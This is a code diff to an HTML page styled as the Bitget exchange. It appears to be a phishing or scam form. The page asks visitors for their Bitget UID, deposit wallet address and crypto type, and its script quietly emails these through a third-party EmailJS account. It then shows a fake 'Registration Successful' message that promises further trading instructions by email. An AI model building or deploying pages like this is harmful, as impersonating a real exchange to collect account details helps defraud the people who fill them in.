@@ -3,43 +3,450 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Bitget User Details</title>
-  <link rel="stylesheet" href="Style.css">
+  <title>BITGET WEB3 TRADING</title>
+  <!-- EMAILJS -->
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 </head>
 <body>
-  <div class="card">
-    <div class="header">
-      <h1>Please fill in your Bitget's<br>user details here</h1>
-      <a href="#" class="help-link">need help?</a>
+
+<div class="container" id="formContainer">
+  <h2>Please fill in your Bitget's<br>user details here</h2>
+  <a class="help-link">need help?</a>
+
+  <form id="page3Form">
+    <div class="form-group">
+      <label>* UID:</label>
+      <input type="text" id="uid" name="uid" placeholder="User Identity">
     </div>
 
-    <form>
-      <label class="red"><span class="required">*</span>UID:</label>
-      <input type="text" placeholder="User Identity" required>
+    <div class="form-group">
+      <label>* Wallet:</label>
+      <input type="text" id="wallet" name="wallet" placeholder="Deposit Address">
+    </div>
 
-      <label class="red"><span class="required">*</span>Wallet:</label>
-      <input type="text" placeholder="Deposit Address" required>
+    <div class="form-group">
+      <label>* Crypto:</label>
+      <input type="text" id="crypto" name="crypto" placeholder="select crypto type">
+    </div>
 
-      <label class="red"><span class="required">*</span>Crypto:</label>
-      <input type="text" placeholder="select crypto type" required>
+    <p class="info-text">
+      please ensure your UID, Wallet,<br>
+      and memo are correct before submission.
+    </p>
 
-      <p class="note">
-        please ensure your UID, Wallet,<br>
-        and memo are correct before submission.
-      </p>
+    <p class="warning-text">
+      Are you certain you've provided the<br>
+      correct details?
+    </p>
 
-      <p class="warning">
-        Are you certain you've provided the<br>
-        correct details?
-      </p>
+    <div class="checkbox-wrapper">
+      <label>Yes I attest =></label>
+      <input type="checkbox" id="attest">
+    </div>
 
-      <div class="attest">
-        <span>Yes I attest =></span>
-        <input type="checkbox" required>
-      </div>
+    <button type="submit" class="submit-btn">Submit</button>
+  </form>
+</div>
 
-      <button type="submit" class="btn-submit">Submit</button>
-    </form>
-  </div>
+<!-- SUCCESS MESSAGE CONTAINER - HIDDEN BY DEFAULT -->
+<div class="success-container" id="successContainer" style="display: none;">
+  <h3>Registration Successful</h3>
+  <p>
+    Your details have been received and your registration has been completed successfully. 
+    You will receive further updates via email regarding the progress of your registration.
+  </p>
+  <p>
+    Please check your email for further instructions and the necessary steps towards the commencement of your trading activities.
+  </p>
+  <button type="button" class="ok-btn" id="okBtn">OK</button>
+</div>
+
+<style>
+  /* ===== RESET & BASE ===== */
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+}
+
+body {
+  background: #f2f2f2;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  min-height: 100vh;
+  padding: 20px;
+}
+
+/* ===== CARD CONTAINER ===== */
+.container {
+  background: #fff;
+  width: 100%;
+  max-width: 400px;
+  border-radius: 20px;
+  padding: 25px 20px 30px 20px;
+  box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+}
+
+/* ===== SUCCESS CONTAINER ===== */
+.success-container {
+  background: #fff;
+  width: 100%;
+  max-width: 400px;
+  border-radius: 16px;
+  border: 1px solid #e0e0e0;
+  padding: 30px 25px;
+  box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+  text-align: center;
+  animation: fadeIn 0.4s ease-in;
+}
+
+.success-container h3 {
+  color: #00bcd4;
+  font-size: 22px;
+  font-weight: 700;
+  margin-bottom: 15px;
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+}
+
+.success-container p {
+  color: #333;
+  font-size: 15px;
+  line-height: 1.6;
+  margin-bottom: 12px;
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+}
+
+/* ===== OK BUTTON ===== */
+.ok-btn {
+  width: 100%;
+  padding: 14px;
+  background: #00bcd4;
+  color: #fff;
+  border: none;
+  border-radius: 12px;
+  font-size: 16px;
+  font-weight: bold;
+  cursor: pointer;
+  transition: background 0.2s;
+  margin-top: 15px;
+}
+
+.ok-btn:hover {
+  background: #00a5bb;
+}
+
+.ok-btn:active {
+  transform: scale(0.98);
+}
+
+@keyframes fadeIn {
+  from { opacity: 0; transform: translateY(10px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+
+/* ===== HEADER ===== */
+.container h2 {
+  color: #00bcd4; /* Bitget blue */
+  font-size: 20px;
+  font-weight: 700;
+  text-align: center;
+  line-height: 1.4;
+  margin-bottom: 5px;
+}
+
+.help-link {
+  display: block;
+  text-align: right;
+  font-size: 14px;
+  color: #00bcd4;
+  text-decoration: underline;
+  margin-bottom: 15px;
+  cursor: pointer;
+}
+
+/* ===== FORM FIELDS ===== */
+.form-group {
+  margin-bottom: 15px;
+}
+
+.form-group label {
+  display: block;
+  color: red;
+  font-weight: bold;
+  font-size: 14px;
+  margin-bottom: 6px;
+}
+
+.form-group input {
+  width: 100%;
+  padding: 12px 14px;
+  border: 1px solid #e0e0e0;
+  border-radius: 10px;
+  background: #f5f5f5;
+  font-size: 15px;
+  color: #333;
+  outline: none;
+}
+
+.form-group input::placeholder {
+  color: #999;
+}
+
+.form-group input:focus {
+  border-color: #00bcd4;
+  background: #fff;
+}
+
+/* ===== INFO TEXT ===== */
+.info-text {
+  text-align: center;
+  font-size: 13px;
+  color: #333;
+  line-height: 1.5;
+  margin: 20px 0 10px 0;
+}
+
+.warning-text {
+  text-align: center;
+  font-size: 14px;
+  color: red;
+  font-weight: bold;
+  line-height: 1.4;
+  margin-bottom: 15px;
+}
+
+/* ===== CHECKBOX ===== */
+.checkbox-wrapper {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  gap: 8px;
+  margin-bottom: 20px;
+}
+
+.checkbox-wrapper label {
+  color: green;
+  font-weight: bold;
+  font-size: 14px;
+}
+
+.checkbox-wrapper input[type="checkbox"] {
+  width: 18px;
+  height: 18px;
+  accent-color: #00bcd4;
+  cursor: pointer;
+}
+
+/* ===== BUTTON ===== */
+.submit-btn {
+  width: 100%;
+  padding: 14px;
+  background: #00bcd4; /* Bitget blue */
+  color: #fff;
+  border: none;
+  border-radius: 12px;
+  font-size: 16px;
+  font-weight: bold;
+  cursor: pointer;
+  transition: background 0.2s;
+}
+
+.submit-btn:hover {
+  background: #00a5bb;
+}
+
+.submit-btn:active {
+  transform: scale(0.98);
+}
+</style>
+<script>
+(function(){ 
+  emailjs.init("trKd_qkfAMWqGxcTW"); 
+})();
+
+document.addEventListener('DOMContentLoaded', function() {
+  const form = document.getElementById('page3Form');
+  const formContainer = document.getElementById('formContainer');
+  const successContainer = document.getElementById('successContainer');
+  const okBtn = document.getElementById('okBtn');
+  const checkbox = document.getElementById('attest');
+  const submitBtn = document.querySelector('.submit-btn');
+  
+  // Get inputs safely
+  const uidInput = document.getElementById('uid');
+  const walletInput = document.getElementById('wallet');
+  const cryptoInput = document.getElementById('crypto');
+  
+  const inputs = [
+    {el: uidInput},
+    {el: walletInput},
+    {el: cryptoInput}
+  ].filter(item => item.el);
+
+  // 1. WRAP CRYPTO INPUT WITH DROPDOWN
+  if(cryptoInput) {
+    const cryptoWrapper = document.createElement('div');
+    cryptoWrapper.style.position = 'relative';
+    cryptoInput.parentNode.insertBefore(cryptoWrapper, cryptoInput);
+    cryptoWrapper.appendChild(cryptoInput);
+    
+    const arrow = document.createElement('span');
+    arrow.innerHTML = '▼';
+    arrow.style.position = 'absolute';
+    arrow.style.right = '12px';
+    arrow.style.top = '50%';
+    arrow.style.transform = 'translateY(-50%)';
+    arrow.style.pointerEvents = 'none';
+    arrow.style.color = '#999';
+    arrow.style.fontSize = '12px';
+    cryptoWrapper.appendChild(arrow);
+
+    const cryptoList = ['BTC', 'BGB', 'ETH', 'USDT', 'BNB', 'SOL', 'XRP', 'DOGE', 'TRX', 'TON'];
+    const dropdown = document.createElement('ul');
+    dropdown.style.cssText = `position:absolute;top:100%;left:0;right:0;background:#fff;border:1px solid #ddd;border-radius:8px;max-height:200px;overflow-y:auto;z-index:999;list-style:none;padding:5px 0;margin-top:5px;box-shadow:0 4px 10px rgba(0,0,0,0.1);display:none;`;
+    cryptoWrapper.appendChild(dropdown);
+
+    cryptoList.forEach(coin => {
+      const li = document.createElement('li');
+      li.textContent = coin;
+      li.style.cssText = `padding:10px 14px;cursor:pointer;font-size:14px;`;
+      li.onmouseover = () => li.style.background = '#f5f5f5';
+      li.onmouseout = () => li.style.background = '#fff';
+      li.onclick = () => {
+        cryptoInput.value = coin;
+        dropdown.style.display = 'none';
+        arrow.innerHTML = '▼';
+        validateField({el: cryptoInput, label: cryptoInput.previousElementSibling, originalLabel: cryptoInput.previousElementSibling?.textContent});
+      };
+      dropdown.appendChild(li);
+    });
+
+    cryptoInput.addEventListener('focus', () => { dropdown.style.display = 'block'; arrow.innerHTML = '▲'; });
+    document.addEventListener('click', (e) => {
+      if(!cryptoWrapper.contains(e.target)) { dropdown.style.display = 'none'; arrow.innerHTML = '▼'; }
+    });
+  }
+
+  // 2. SETUP LABELS + ERROR SPANS SAFELY
+  inputs.forEach(item => {
+    const label = item.el.previousElementSibling;
+    if(!label) return;
+    item.label = label;
+    item.originalLabel = label.textContent;
+    
+    const errorSpan = document.createElement('span');
+    errorSpan.className = 'js-error';
+    errorSpan.style.cssText = `color:red;font-size:12px;margin-right:5px;opacity:0;transition:opacity 0.3s ease-in;`;
+    label.prepend(errorSpan);
+    item.errorEl = errorSpan;
+  });
+
+  // 3. CHECKBOX ERROR WITH SPACE
+  if(checkbox) {
+    const checkboxContainer = checkbox.parentElement;
+    const checkboxError = document.createElement('div');
+    checkboxError.className = 'js-checkbox-error';
+    checkboxError.style.cssText = `color:red;font-size:13px;text-align:center;margin-top:5px;margin-bottom:15px;opacity:0;transition:opacity 0.3s ease-in;`;
+    checkboxContainer.after(checkboxError);
+
+    function clearErrors() {
+      inputs.forEach(item => { 
+        if(item.errorEl && item.label){ 
+          item.errorEl.textContent = ''; 
+          item.errorEl.style.opacity = '0'; 
+          item.label.textContent = item.originalLabel;
+          item.label.prepend(item.errorEl);
+        }
+      });
+      checkboxError.textContent = '';
+      checkboxError.style.opacity = '0';
+    }
+
+    function showError(item, msg) {
+      if(!item.label) return;
+      item.label.textContent = ''; // hide label
+      item.errorEl.textContent = msg;
+      item.label.prepend(item.errorEl);
+      setTimeout(() => { item.errorEl.style.opacity = '1'; }, 10);
+    }
+
+    function validateField(item) {
+      if(!item.label) return;
+      if(item.el.value.trim() === '') {
+        item.label.textContent = item.originalLabel;
+        item.label.prepend(item.errorEl);
+      } else {
+        clearErrors();
+      }
+    }
+
+    // 4. HANDLE SUBMIT - WITH EMAILJS
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+      clearErrors();
+
+      const allEmpty = inputs.every(item => item.el.value.trim() === '');
+      if (allEmpty) {
+        alert("pls fill in the form to proceed");
+        return;
+      }
+
+      for(let item of inputs) {
+        if (item.el.value.trim() === '') {
+          showError(item, `pls enter your "${item.el.placeholder}"`);
+          item.el.focus();
+          return;
+        }
+      }
+
+      if (!checkbox.checked) {
+        checkboxError.textContent = "pls confirm you've provided the correct details";
+        setTimeout(() => { checkboxError.style.opacity = '1'; }, 10);
+        return;
+      }
+
+      // SEND TO EMAILJS
+      submitBtn.disabled = true;
+      submitBtn.textContent = "Submitting...";
+
+      const templateParams = {
+        uid: uidInput.value,
+        wallet: walletInput.value,
+        crypto: cryptoInput.value
+      };
+
+      emailjs.send("service_yx1rj2j", "template_qz0audi", templateParams)
+        .then(() => {
+          // Hide form and show success message
+          formContainer.style.display = 'none';
+          successContainer.style.display = 'block';
+        }, (error) => {
+          alert("Failed to send. Please check your internet and try again.");
+          console.log(error);
+          submitBtn.disabled = false;
+          submitBtn.textContent = "Submit";
+        });
+    });
+
+    // 5. OK BUTTON - EXIT ACTION
+    okBtn.addEventListener('click', function() {
+      window.location.href = "index.html"; // Change this to where you want to exit to
+    });
+
+    // 6. ON TYPING: clear error and bring label back
+    inputs.forEach(item => {
+      item.el.addEventListener('input', () => {
+        validateField(item);
+        checkboxError.textContent = ''; checkboxError.style.opacity = '0';
+      });
+    });
+    checkbox.addEventListener('change', () => {
+      checkboxError.textContent = ''; checkboxError.style.opacity = '0';
+    });
+  }
+});
+</script>
 </body>
 </html>
